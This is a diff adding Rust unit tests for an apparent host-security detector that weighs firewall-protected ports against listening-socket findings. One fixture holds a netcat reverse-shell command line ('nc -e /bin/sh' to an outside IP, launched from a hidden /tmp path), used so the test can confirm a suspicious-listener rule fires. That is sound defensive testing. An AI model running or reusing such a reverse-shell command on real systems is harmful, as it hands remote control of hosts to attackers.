@@ -272,6 +272,52 @@ fn high_risk_public_port_includes_firewall_context_when_available() {
 }
 
 #[test]
+fn suppresses_high_risk_public_port_when_firewall_protects_tcp_port() {
+    let findings = detect_with_default_config(vec![
+        socket_event("network", 6379),
+        RawEvent::new("firewall", "firewall_state")
+            .with_field("status", "active")
+            .with_field("sources", "nftables")
+            .with_field("protected_tcp_ports", "6379"),
+    ]);
+
+    assert!(findings.is_empty());
+}
+
+#[test]
+fn protected_high_risk_port_still_reports_suspicious_listener_process() {
+    let findings = detect_with_default_config(vec![
+        RawEvent::new("network", "listening_socket")
+            .with_field("protocol", "tcp")
+            .with_field("local_addr", "0.0.0.0")
+            .with_field("local_port", "6379")
+            .with_field("process_name", "sh")
+            .with_field("executable", "/tmp/.x/sh")
+            .with_field("cmdline", "sh -c nc -e /bin/sh 1.2.3.4 4444"),
+        RawEvent::new("firewall", "firewall_state")
+            .with_field("status", "active")
+            .with_field("sources", "nftables")
+            .with_field("protected_tcp_ports", "6379"),
+    ]);
+
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "NET-003");
+}
+
+#[test]
+fn suppresses_new_public_tcp_port_when_firewall_protects_port() {
+    let findings = detect_with_default_config(vec![
+        socket_event("baseline", 4444),
+        RawEvent::new("firewall", "firewall_state")
+            .with_field("status", "active")
+            .with_field("sources", "nftables")
+            .with_field("protected_tcp_ports", "4444"),
+    ]);
+
+    assert!(findings.is_empty());
+}
+
+#[test]
 fn high_risk_public_port_dedup_ignores_firewall_source_churn() {
     let first = detect_with_default_config(vec![
         socket_event("network", 6379),
